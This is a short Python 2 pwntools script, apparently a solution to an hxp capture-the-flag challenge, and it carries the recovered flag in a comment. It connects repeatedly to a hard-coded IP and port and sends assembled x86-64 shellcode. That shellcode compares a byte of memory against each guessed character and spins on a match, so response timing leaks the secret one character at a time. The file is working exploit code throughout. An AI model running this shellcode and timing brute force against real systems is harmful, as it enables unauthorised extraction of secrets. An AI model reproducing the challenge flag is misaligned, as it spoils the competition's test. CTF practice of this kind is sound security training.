#!/usr/bin/env python
from pwn import *
import time

# hxp{y0u_w0uldnt_b3l13v3_h0w_m4ny_3mulat0rs_g0t_th1s_wr0ng}

context.arch = 'amd64'
host , port = '195.201.127.119' , 8664

pool = range( 0x61 , 0x7b ) + range( 0x30 , 0x3a ) + map( ord , ' _!?{}-+~:;><@#$()/\\=' ) + range( 0x41 , 0x5b )
flag = ''

for i in xrange( 4 , 0x70 ):
    for c in pool:
        y = remote( host , port )

        y.sendline( str( i ) )

        sc = asm('''
            cmp BYTE PTR [rip+0x2], %s
        y:
            je y
        ''' % hex( c ) )

        y.sendafter( 'please.' , sc )
        a = time.time()
        y.recvrepeat(timeout = 1.6)
        b = time.time() - a
        print b , chr( c )
        if b > 1:
            flag += chr( c )
            print flag
            y.close()
            break
        y.close()




#y.interactive()